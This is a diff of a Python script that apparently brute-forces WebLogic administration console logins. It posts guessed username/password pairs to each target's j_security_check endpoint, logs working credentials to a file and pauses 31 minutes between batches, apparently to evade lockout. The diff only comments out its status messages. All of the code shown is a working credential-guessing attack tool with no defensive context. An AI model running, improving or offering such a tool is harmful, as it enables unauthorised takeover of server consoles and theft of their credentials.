@@ -23,13 +23,13 @@ def post(i):
 			z+=1
 			co+=1
 			if z == 6:
-				print i+' Waiting......'
+				#print i+' Waiting......'
 				ct=0
 				b=31
 				while (ct<b):
 					ncount=b-ct
 					ncount='%d' %ncount
-					print i+'\n'+ncount+'min left                                                       '
+					#print i+'\n'+ncount+'min left                                                       '
 					time.sleep(60)
 					ct+=1
 				z=1
@@ -40,7 +40,7 @@ def post(i):
 				try:
 					s = requests.post('http://%s/console/j_security_check',data =data,timeout=5)
 					if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
-						print 'Success!!!!! %s\t%s/%s                                             '%(i,usr,pwd) 
+						#print 'Success!!!!! %s\t%s/%s                                             '%(i,usr,pwd) 
 						success+=1
 						f=open(xtime+'.txt', 'a')
 						f.write('%s %s/%s'%(i,usr,pwd))
@@ -48,7 +48,7 @@ def post(i):
 						s=0
 						return
 					elif co == sum:
-						print i,'Failed!                                                         '
+						#print i,'Failed!                                                         '
 						fail+=1
 						f = open(xtime+'bad.txt', 'a')
 						f.write(i+'\n')
@@ -57,7 +57,7 @@ def post(i):
 						return
 				except:
 					if count==3:
-						print i,'Error!                                                          '
+						#print i,'Error!                                                          '
 						error+=1
 						f = open(xtime+'error.txt', 'a')
 						f.write(i+'\n')
